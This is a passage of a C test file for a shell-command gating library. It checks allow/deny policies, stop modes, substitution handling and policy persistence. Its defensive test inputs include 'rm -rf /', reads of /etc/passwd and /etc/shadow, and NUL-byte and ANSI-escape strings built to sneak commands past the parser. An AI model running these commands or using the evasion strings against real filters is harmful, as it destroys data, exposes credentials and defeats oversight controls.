        ASSERT(results[g].subcommand_count == 1);
        ASSERT_STR(results[g].subcommands[0].netargv, cases[i].argv);
      }
      ASSERT(results[0].anomaly_score == results[1].anomaly_score &&
             results[0].anomaly_score_raw == results[1].anomaly_score_raw &&
             results[0].anomaly_score_type == results[1].anomaly_score_type);
    }
  }
  for (size_t g = 0; g < 2; g++)
    sg_gate_free(gates[g]);
}

TEST(comment_only_source_does_not_trigger_feature_rejection) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, SHELL_FEAT_PROCESS_SUB));

  static const char *const cases[] = {
      "# <(printf data)",
      "\\\n",
      "\\\n # <(printf data)\n",
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(eval_cmd(gate, cases[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT(result.subcommand_count == 0);
    ASSERT(!result.requires_substitution_evaluation);
    ASSERT(!result.has_dynamic_substitution_io);
    ASSERT(!result.truncated);
  }
  sg_gate_free(gate);
}

/* --- CONFIGURATION --- */

TEST(stop_mode_matrix) {
  static const struct {
    sg_stop_mode_t mode;
    const char *allow[3];
    size_t allow_count;
    const char *deny[1];
    size_t deny_count;
    const char *input;
    sg_verdict_t verdict;
    const char *commands[4];
    bool matches[4];
    size_t command_count;
  } cases[] = {
      {SG_STOP_FIRST_FAIL,
       {"ls", "cat #path"},
       2,
       {NULL},
       0,
       "rm ; cat /etc/passwd ; ls",
       SG_VERDICT_UNDETERMINED,
       {"rm"},
       {false},
       1},
      {SG_STOP_FIRST_FAIL,
       {"ls", "pwd"},
       2,
       {NULL},
       0,
       "ls ; rm ; pwd",
       SG_VERDICT_UNDETERMINED,
       {"ls", "rm"},
       {true, false},
       2},
      {SG_STOP_FIRST_PASS,
       {"cat #path", "ls"},
       2,
       {NULL},
       0,
       "echo a ; echo b ; cat /etc/passwd ; ls",
       SG_VERDICT_UNDETERMINED,
       {"echo a", "echo b", "cat /etc/passwd"},
       {false, false, true},
       3},
      {SG_STOP_FIRST_PASS,
       {"ls"},
       1,
       {NULL},
       0,
       "ls ; rm",
       SG_VERDICT_ALLOW,
       {"ls"},
       {true},
       1},
      {SG_STOP_FIRST_ALLOW,
       {"ls", "cat #path"},
       2,
       {NULL},
       0,
       "ls ; cat /etc/passwd ; rm -rf /",
       SG_VERDICT_ALLOW,
       {"ls"},
       {true},
       1},
      {SG_STOP_FIRST_DENY,
       {"ls", "cat #path"},
       2,
       {"cat /etc/shadow"},
       1,
       "ls ; cat /etc/shadow ; pwd",
       SG_VERDICT_DENY,
       {"ls", "cat /etc/shadow"},
       {true, true},
       2},
      {SG_STOP_FIRST_DENY,
       {"ls"},
       1,
       {"rm -rf /"},
       1,
       "ls ; pwd ; ls",
       SG_VERDICT_UNDETERMINED,
       {"ls", "pwd", "ls"},
       {true, false, true},
       3},
      {SG_EVAL_ALL,
       {"ls", "cat #path"},
       2,
       {NULL},
       0,
       "ls ; echo rm ; cat /etc/passwd",
       SG_VERDICT_UNDETERMINED,
       {"ls", "echo rm", "cat /etc/passwd"},
       {true, false, true},
       3},
      {SG_EVAL_ALL,
       {"ls", "cat #path"},
       2,
       {"cat /etc/shadow"},
       1,
       "ls ; cat /etc/shadow ; ls",
       SG_VERDICT_DENY,
       {"ls", "cat /etc/shadow", "ls"},
       {true, true, true},
       3},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = gate_with_rules(cases[i].allow, cases[i].allow_count);
    ASSERT(g != NULL);
    for (size_t j = 0; j < cases[i].deny_count; j++)
      ASSERT(test_policy_replace_cpl(g, true, cases[i].deny[j], false) ==
             ST_OK);
    ASSERT(sg_gate_set_stop_mode(g, cases[i].mode) == SG_OK);

    sg_result_t result;
    ASSERT(eval_cmd(g, cases[i].input, &result) == SG_OK);
    ASSERT(result.verdict == cases[i].verdict);
    ASSERT(result.subcommand_count == cases[i].command_count);
    ASSERT(result.short_circuited == (i < 6));
    for (size_t j = 0; j < cases[i].command_count; j++) {
      ASSERT(result.subcommands[j].display_command != NULL);
      ASSERT_STR(result.subcommands[j].display_command, cases[i].commands[j]);
      ASSERT(result.subcommands[j].matches == cases[i].matches[j]);
    }
    sg_gate_free(g);
  }
}

TEST(stop_mode_substitution_prefix) {
  static const char *rules[] = {"echo *", "whoami", "cat", "id"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_STOP_FIRST_ALLOW));

  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "echo $(whoami) ; rm -rf /", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.short_circuited);
  ASSERT(result.subcommand_count == 1);
  ASSERT_STR(result.subcommands[0].display_command, "echo $(whoami)");
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(!result.truncated);

  ASSERT_SG_OK(eval_cmd(gate, "echo $(</tmp/direct) ; rm -rf /", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.short_circuited);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);

  ASSERT(!result.truncated);

  /* Stop mode may omit nested producers and later shell-list siblings from
   * the materialized results, but it must not omit the root dynamic-content
   * requirement carried by an expandable heredoc. */
  ASSERT_SG_OK(eval_cmd(gate, "cat <<EOF\n$(id)\nEOF\nrm -rf /", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW_CONDITIONAL);
  ASSERT(result.short_circuited);
  ASSERT(result.subcommand_count == 1);
  ASSERT(result.requires_substitution_evaluation);
  ASSERT(result.subcommands[0].requires_substitution_evaluation);
  ASSERT(!result.truncated);
  sg_gate_free(gate);
}

TEST(stop_mode_group_redirect_entry_order) {
  static const char *rules[] = {"echo first", "printf tail", "printf body"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  const char *command = "echo first; { printf body; } > >(printf tail)";
  sg_result_t result = {0};

  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[0].display_command, "echo first");
  ASSERT_STR(result.subcommands[1].display_command, "printf tail");
  ASSERT_STR(result.subcommands[2].display_command, "printf body");

  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_STOP_FIRST_ALLOW));
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.short_circuited && result.subcommand_count == 1 &&
         result.subcommands[0].verdict == SG_VERDICT_ALLOW);
  ASSERT_STR(result.subcommands[0].display_command, "echo first");
  sg_gate_free(gate);
}

TEST(pipeline_many_subcommands) {
  sg_gate_t *g = sg_gate_new();
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "ls", false));
  ASSERT_SG_OK(sg_gate_set_stop_mode(g, SG_EVAL_ALL));
  sg_result_t r;
  ASSERT_SG_OK(
      eval_cmd(g, "ls ; ls ; ls ; ls ; ls ; ls ; ls ; ls ; ls ; ls", &r));
  ASSERT(r.subcommand_count == 10);
  for (uint32_t i = 0; i < r.subcommand_count; i++) {
    ASSERT(r.subcommands[i].matches);
  }

  char command[512] = {0};
  for (size_t i = 0; i < SG_MAX_SUBCOMMAND_RESULTS + 1; i++)
    strcat(command, i == 0 ? "ls" : " ; ls");
  ASSERT(eval_cmd(g, command, &r) == SG_ERR_TRUNC);
  ASSERT(r.truncated);
  ASSERT(r.subcommand_truncated);
  ASSERT(r.subcommand_count == SG_MAX_SUBCOMMAND_RESULTS);
  ASSERT(r.verdict == SG_VERDICT_UNDETERMINED);
  sg_gate_free(g);
}

/* --- POLICY MANAGEMENT --- */

TEST(policy_mutation_matrix) {
  enum policy_action {
    POLICY_PROBE,
    POLICY_ADD_ALLOW,
    POLICY_REMOVE_ALLOW,
    POLICY_ADD_DENY,
    POLICY_REMOVE_DENY,
  };
  static const struct {
    enum policy_action action;
    const char *pattern;
    uint32_t allow_count;
    uint32_t deny_count;
    const char *probe;
    sg_verdict_t verdict;
  } steps[] = {
      {POLICY_PROBE, NULL, 0, 0, "ls", SG_VERDICT_UNDETERMINED},
      {POLICY_ADD_ALLOW, "ls", 1, 0, "ls", SG_VERDICT_ALLOW},
      {POLICY_ADD_ALLOW, "ls", 1, 0, "ls", SG_VERDICT_ALLOW},
      {POLICY_ADD_ALLOW, "cat", 2, 0, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_ADD_ALLOW, "cat /etc/passwd", 3, 0, "cat /etc/passwd",
       SG_VERDICT_ALLOW},
      {POLICY_ADD_ALLOW, "rm", 4, 0, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_REMOVE_ALLOW, "cat", 3, 0, "cat /etc/passwd", SG_VERDICT_ALLOW},
      {POLICY_REMOVE_ALLOW, "nonexistent", 3, 0, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_ADD_DENY, "cat /etc/passwd", 3, 1, "cat /etc/passwd",
       SG_VERDICT_DENY},
      {POLICY_ADD_DENY, "cat /etc/passwd", 3, 1, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_REMOVE_DENY, "nonexistent", 3, 1, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_REMOVE_DENY, "cat /etc/passwd", 3, 0, "cat /etc/passwd",
       SG_VERDICT_ALLOW},
      {POLICY_REMOVE_ALLOW, "ls", 2, 0, NULL, SG_VERDICT_UNDETERMINED},
      {POLICY_REMOVE_ALLOW, "cat /etc/passwd", 1, 0, NULL,
       SG_VERDICT_UNDETERMINED},
      {POLICY_REMOVE_ALLOW, "rm", 0, 0, "ls", SG_VERDICT_UNDETERMINED},
  };

  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  for (size_t i = 0; i < sizeof(steps) / sizeof(steps[0]); i++) {
    st_error_t err = ST_OK;
    switch (steps[i].action) {
    case POLICY_PROBE:
      break;
    case POLICY_ADD_ALLOW:
      err = test_policy_replace_cpl(g, false, steps[i].pattern, false);
      break;
    case POLICY_REMOVE_ALLOW:
      err = test_policy_replace_cpl(g, false, steps[i].pattern, true);
      break;
    case POLICY_ADD_DENY:
      err = test_policy_replace_cpl(g, true, steps[i].pattern, false);
      break;
    case POLICY_REMOVE_DENY:
      err = test_policy_replace_cpl(g, true, steps[i].pattern, true);
      break;
    }
    ASSERT(err == ST_OK);
    ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_allow_policy_borrowed(g)),
                   steps[i].allow_count);
    ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_deny_policy_borrowed(g)),
                   steps[i].deny_count);

    if (steps[i].probe) {
      sg_result_t result;
      ASSERT(eval_cmd(g, steps[i].probe, &result) == SG_OK);
      ASSERT(result.verdict == steps[i].verdict);
      ASSERT_EQ_UINT(result.subcommand_count, 1);
      ASSERT_STR(result.subcommands[0].display_command, steps[i].probe);
      ASSERT(result.subcommands[0].verdict == steps[i].verdict);
      ASSERT(result.subcommands[0].matches ==
             (steps[i].verdict != SG_VERDICT_UNDETERMINED));
    }
  }

  sg_gate_free(g);
}

TEST(canonical_policy_mutation_matrix) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);

  st_netpattern_t allow_ls = {0};
  st_netpattern_t allow_pwd = {0};
  st_netpattern_t deny_rm = {0};
  ASSERT(st_netpattern_from_cpl_owned("ls", &allow_ls) == ST_OK);
  ASSERT(st_netpattern_from_cpl_owned("pwd", &allow_pwd) == ST_OK);
  ASSERT(st_netpattern_from_cpl_owned("rm", &deny_rm) == ST_OK);

  const st_netpattern_view_t allow_patterns[] = {
      {allow_ls.data, allow_ls.length}, {allow_pwd.data, allow_pwd.length}};
  ASSERT_ST_OK(
      test_policy_replace_patterns(gate, false, allow_patterns, 2, false));
  ASSERT_ST_OK(
      test_policy_replace_pattern(gate, false, allow_patterns[0], false));
  ASSERT(test_policy_replace_pattern(
             gate, false,
             (st_netpattern_view_t){"not a canonical netpattern",
                                    sizeof("not a canonical netpattern") - 1},
             false) == ST_ERR_FORMAT);
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)), 2);

  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_SG_OK(eval_cmd(gate, "pwd", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);

  ASSERT_ST_OK(test_policy_replace_pattern(
      gate, true, (st_netpattern_view_t){deny_rm.data, deny_rm.length}, false));
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_deny_policy_borrowed(gate)), 1);
  ASSERT_SG_OK(eval_cmd(gate, "rm", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY);
  ASSERT_ST_OK(test_policy_replace_pattern(
      gate, true, (st_netpattern_view_t){deny_rm.data, deny_rm.length}, true));
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_deny_policy_borrowed(gate)), 0);

  const st_netpattern_view_t invalid_batch[] = {
      {allow_ls.data, allow_ls.length},
      {"not-a-netpattern", sizeof("not-a-netpattern") - 1}};
  ASSERT(test_policy_replace_patterns(gate, false, invalid_batch, 2, false) ==
         ST_ERR_FORMAT);
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)), 2);
  ASSERT_ST_OK(test_policy_replace_pattern(
      gate, false, (st_netpattern_view_t){allow_ls.data, allow_ls.length},
      true));
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)), 1);

  ASSERT(test_policy_replace_patterns(gate, false, NULL, 1, false) ==
         ST_ERR_INVALID);
  ASSERT(test_policy_replace_patterns(gate, false, allow_patterns, 0, false) ==
         ST_ERR_INVALID);

  ASSERT(test_policy_replace_patterns(gate, true, NULL, 1, false) ==
         ST_ERR_INVALID);

  st_netpattern_free(&allow_ls);
  st_netpattern_free(&allow_pwd);
  st_netpattern_free(&deny_rm);
  sg_gate_free(gate);
}

TEST(binary_canonical_policy_mutations) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  st_netpattern_t patterns[3] = {{0}};
  const char *const cpl[] = {"printf \"a\\x00b\"", "say \"\" \"two words\"",
                             "pwd"};
  st_netpattern_view_t views[3];
  char *storage[3];
  for (size_t i = 0; i < 3; i++) {
    ASSERT(st_netpattern_from_cpl_owned(cpl[i], &patterns[i]) == ST_OK);
    storage[i] = malloc(patterns[i].length);
    ASSERT(storage[i] != NULL);
    memcpy(storage[i], patterns[i].data, patterns[i].length);
    views[i] = (st_netpattern_view_t){storage[i], patterns[i].length};
    st_netpattern_free(&patterns[i]);
  }
  ASSERT(memchr(views[0].data, '\0', views[0].length) != NULL);
  ASSERT_ST_OK(test_policy_replace_pattern(gate, false, views[0], false));
  ASSERT_ST_OK(test_policy_replace_patterns(gate, false, views, 2, false));
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)), 2);
  ASSERT_ST_OK(test_policy_replace_pattern(gate, true, views[0], false));
  ASSERT_ST_OK(test_policy_replace_patterns(gate, true, views, 2, false));
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_deny_policy_borrowed(gate)), 2);

  const st_netpattern_view_t invalid[] = {views[2],
                                          {views[0].data, views[0].length - 1}};
  ASSERT_EQ_INT(test_policy_replace_patterns(gate, false, invalid, 2, false),
                ST_ERR_FORMAT);
  ASSERT_EQ_INT(test_policy_replace_patterns(gate, true, invalid, 2, false),
                ST_ERR_FORMAT);
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)), 2);
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_deny_policy_borrowed(gate)), 2);
  st_test_alloc_fail_at(1);
  st_error_t error =
      test_policy_replace_patterns(gate, false, &views[2], 1, false);
  st_test_alloc_reset();
  ASSERT_EQ_INT(error, ST_ERR_MEMORY);
  st_test_alloc_fail_at(1);
  error = test_policy_replace_patterns(gate, true, &views[2], 1, false);
  st_test_alloc_reset();
  ASSERT_EQ_INT(error, ST_ERR_MEMORY);
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)), 2);
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_deny_policy_borrowed(gate)), 2);

  ASSERT_ST_OK(test_policy_replace_pattern(gate, false, views[0], true));
  ASSERT_ST_OK(test_policy_replace_pattern(gate, true, views[0], true));
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)), 1);
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_deny_policy_borrowed(gate)), 1);
  for (size_t i = 0; i < 3; i++)
    free(storage[i]);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "say '' 'two words'", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY);
  sg_gate_free(gate);
}

TEST(binary_cpl_policy_contract) {
  static const char *pattern = "printf \"a\\x00b\"";
  static const char *command = "printf $'a\\0b'";
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);

  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, pattern, false));
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)), 1);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT_EQ_UINT(result.subcommand_count, 1);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
         result.subcommands[0].verdict == SG_VERDICT_UNDETERMINED);

  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, pattern, false));
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_deny_policy_borrowed(gate)), 1);
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  ASSERT_EQ_UINT(result.subcommand_count, 1);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, pattern, true));
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_deny_policy_borrowed(gate)), 0);
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT_EQ_UINT(result.subcommand_count, 1);

  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, pattern, true));
  ASSERT_EQ_UINT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)), 0);
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT_EQ_UINT(result.subcommand_count, 1);
  sg_gate_free(gate);
}

TEST(ansi_nul_source_rejection) {
  static const char *const rejected[] = {
      "e$'val\\0x' 'printf bypass'",
      "export $'POSIXLY_CORRECT\\0X'=1",
      "printf \"${v:-$'a\\x00b'}\"",
      "printf \"${v#${u:-$'a\\0b'}}\"",
      "printf \"${v/x/${u:+$'a\\0b'}}\"",
      "echo \"${v:-$'$(echo \"\\\\\\$(printf child)\")'}\"",
      ("cat <<EOF\n${v#${u:-$'${w:-$(echo \"\\\\\\$(printf "
       "child)\")}\\0tail'}}\nEOF\n"),
  };
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  for (size_t i = 0; i < sizeof(rejected) / sizeof(rejected[0]); i++) {
    sg_result_t result = {0};
    ASSERT_EQ_INT(eval_cmd(gate, rejected[i], &result), SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.subcommand_count == 1 &&
           result.subcommands[0].verdict == SG_VERDICT_REJECT &&
           result.subcommands[0].netargv == NULL);
  }
  sg_gate_free(gate);
}

TEST(arithmetic_command_policy) {
  const char *rules[] = {"printf *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "((1))", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  const char *neutral[] = {"((1))",      "((0))",      "((1/0))", "{ ((1)); }",
                           "! ((1))",    "time ((1))", "((1)) &", "((1<<(2)))",
                           "((8>>(1)))", "((1<(2)))"};
  for (size_t i = 0; i < sizeof(neutral) / sizeof(neutral[0]); ++i) {
    ASSERT_SG_OK(eval_cmd(gate, neutral[i], &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 0);
  }
  const char *io[] = {"((1)) >output",      "((1)) <input",
                      "((1)) 2>&1",         "((1)) <<<payload",
                      "{ ((1)); } >output", "((1)) {fd}>output"};
  for (size_t i = 0; i < sizeof(io) / sizeof(io[0]); ++i) {
    ASSERT_SG_OK(eval_cmd(gate, io[i], &result));
    if (result.verdict != SG_VERDICT_UNDETERMINED)
      fprintf(stderr, "arithmetic I/O policy: %s verdict %d\n", io[i],
              result.verdict);
    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
           result.subcommand_count == 0);
  }
  ASSERT_SG_OK(eval_cmd(gate, "((1)) && printf yes", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "printf denied", false));
  ASSERT_SG_OK(eval_cmd(gate, "((1)) >output; printf denied", &result));
  ASSERT(result.verdict == SG_VERDICT_DENY);
  ASSERT_EQ_INT(eval_cmd(gate, "((value++))", &result), SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, SHELL_FEAT_SUBSHELL));
  ASSERT_SG_OK(eval_cmd(gate, "(( $x + $(printf 1) ))", &result));
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  sg_gate_free(gate);
}

TEST(nested_ansi_escape_policy) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "cat", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "printf child", false));
  for (size_t c = 0; c < sizeof(shellsplit_test_ansi_nested_runs) /
                             sizeof(shellsplit_test_ansi_nested_runs[0]);
       ++c) {
    sg_result_t result = {0};
    ASSERT_SG_OK(
        eval_cmd(gate, shellsplit_test_ansi_nested_runs[c].source, &result));
    unsigned children = shellsplit_test_ansi_nested_runs[c].children;
    /* A child whose stdout goes to stderr is still a deny-rule subject, but
     * has no captured substitution stream and requests no word inspection. */
    bool dynamic_io =
        children && !shellsplit_test_ansi_nested_runs[c].stdout_to_stderr;
    if (result.subcommand_count != 1 + children ||
        (result.verdict == SG_VERDICT_DENY) != (children != 0) ||
        result.has_dynamic_substitution_io != dynamic_io)
      fprintf(stderr,
              "ANSI escape policy case %zu: count=%u verdict=%d io=%d: %s\n", c,
              result.subcommand_count, result.verdict,
              result.has_dynamic_substitution_io,
              shellsplit_test_ansi_nested_runs[c].source);
    ASSERT(!result.truncated && !result.short_circuited &&
           result.subcommand_count == 1 + children &&
           (result.verdict == SG_VERDICT_DENY) == (children != 0) &&
           result.has_dynamic_substitution_io == dynamic_io &&
           result.requires_substitution_evaluation == dynamic_io);
  }
  for (size_t c = 0; c < sizeof(shellsplit_test_ansi_phase_cases) /
                             sizeof(shellsplit_test_ansi_phase_cases[0]);
       ++c) {
    sg_result_t result = {0};
    ASSERT_SG_OK(
        eval_cmd(gate, shellsplit_test_ansi_phase_cases[c].source, &result));
    unsigned children = shellsplit_test_ansi_phase_cases[c].children;
    bool stream = shellsplit_test_ansi_phase_cases[c].captured_stdout;
    ASSERT(!result.truncated && !result.short_circuited &&
           result.subcommand_count == 1 + children &&
           (result.verdict == SG_VERDICT_DENY) == (children != 0) &&
           result.has_dynamic_substitution_io == stream &&
           result.requires_substitution_evaluation ==
               (stream && shellsplit_test_ansi_phase_cases[c].kind != '<'));
  }
  for (size_t c = 0;
       c < sizeof(shellsplit_test_ansi_translated_children) /
               sizeof(shellsplit_test_ansi_translated_children[0]);
       ++c) {
    sg_result_t result = {0};
    ASSERT_EQ_INT(
        eval_cmd(gate, shellsplit_test_ansi_translated_children[c], &result),
        SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.subcommand_count == 1 &&
           result.subcommands[0].netargv == NULL);
  }
  for (size_t c = 0; c < sizeof(shellsplit_test_ansi_translated_joins) /
                             sizeof(shellsplit_test_ansi_translated_joins[0]);
       ++c) {
    sg_result_t result = {0};
    ASSERT_EQ_INT(
        eval_cmd(gate, shellsplit_test_ansi_translated_joins[c], &result),
        SG_ERR_PARSE);
    ASSERT(result.verdict == SG_VERDICT_REJECT &&
           result.subcommand_count == 1 &&
           result.subcommands[0].netargv == NULL);
  }
  sg_gate_free(gate);
}

TEST(policy_replacement_failure_atomicity) {
  const char *path = temp_policy_file();
  ASSERT(path != NULL);

  sg_gate_t *source = sg_gate_new();
  sg_gate_t *gate = sg_gate_new();
  ASSERT(source != NULL && gate != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(source, false, "cat #path", false));
  ASSERT_ST_OK(st_policy_save(sg_gate_allow_policy_borrowed(source), path));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "ls", false));

  st_test_alloc_fail_at(1);
  st_error_t error = test_policy_replace_cpl(gate, false, "pwd", false);
  st_test_alloc_reset();
  ASSERT(error == ST_ERR_MEMORY);
  ASSERT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)) == 1);
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_SG_OK(eval_cmd(gate, "pwd", &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);

  st_test_alloc_fail_at(1);
  error = test_policy_replace_from_file(gate, path);
  st_test_alloc_reset();
  ASSERT(error == ST_ERR_MEMORY);
  ASSERT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)) == 1);

  st_test_io_fail_at(1);
  error = st_policy_save(sg_gate_allow_policy_borrowed(gate), path);
  st_test_io_reset();
  ASSERT(error == ST_ERR_IO);

  ASSERT_ST_OK(test_policy_replace_from_file(gate, path));
  ASSERT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)) == 2);
  ASSERT_SG_OK(eval_cmd(gate, "ls", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT_SG_OK(eval_cmd(gate, "cat /etc/hosts", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);

  char missing[256];
  int fd = temp_fixture_file(missing, sizeof(missing), "shellgate-missing");
  ASSERT(fd >= 0);
  ASSERT(close(fd) == 0);
  ASSERT(unlink(missing) == 0);
  ASSERT(test_policy_replace_from_file(gate, missing) == ST_ERR_IO);
  ASSERT(test_policy_replace_cpl(gate, false, "", false) == ST_ERR_INVALID);

  FILE *malformed = fopen(path, "wb");
  ASSERT(malformed != NULL);
  ASSERT(fputs("not a policy\n", malformed) >= 0);
  ASSERT(fclose(malformed) == 0);
  ASSERT(test_policy_replace_from_file(gate, path) == ST_ERR_FORMAT);
  ASSERT(st_policy_rule_count(sg_gate_allow_policy_borrowed(gate)) == 2);

  sg_gate_free(gate);
  sg_gate_free(source);
}

TEST(policy_evaluation_allocation_failure) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));
  ASSERT_ST_OK(test_policy_replace_cpl(gate, true, "rm *", false));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  /* A redirect-only list stage is intentionally not policy-evaluable. It
   * must not hide a memory error while policy evaluation is handling the
   * preceding argv-bearing stage. */
  static const char *const probe_command =
      "unknown argument; >/tmp/shellgate-policy-allocation";
  static const char *const failure_command =
      "another unknown; >/tmp/shellgate-policy-allocation";
  sg_result_t result;
  st_test_alloc_reset();
  ASSERT_SG_OK(eval_cmd(gate, probe_command, &result));
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  size_t allocation_count = st_test_alloc_count();
  ASSERT(allocation_count > 0);
  size_t memory_failures = 0;
  for (size_t i = 1; i <= allocation_count; i++) {
    size_t vocab_before = test_anomaly_vocabulary(gate);
    st_test_alloc_fail_at(i);
    sg_error_t error = eval_cmd(gate, failure_command, &result);
    st_test_alloc_reset();
    if (error == SG_ERR_MEMORY) {
      memory_failures++;
      ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
      ASSERT_EQ_UINT(test_anomaly_vocabulary(gate), vocab_before);
    } else {
      ASSERT(error == SG_OK);
    }
  }
  ASSERT(memory_failures > 0);
  sg_gate_free(gate);
}

/* --- SERIALIZATION --- */

TEST(policy_persistence_matrix) {
  const char *path = temp_policy_file();
  sg_gate_t *g = sg_gate_new();
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "ls", false));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "cat #path", false));
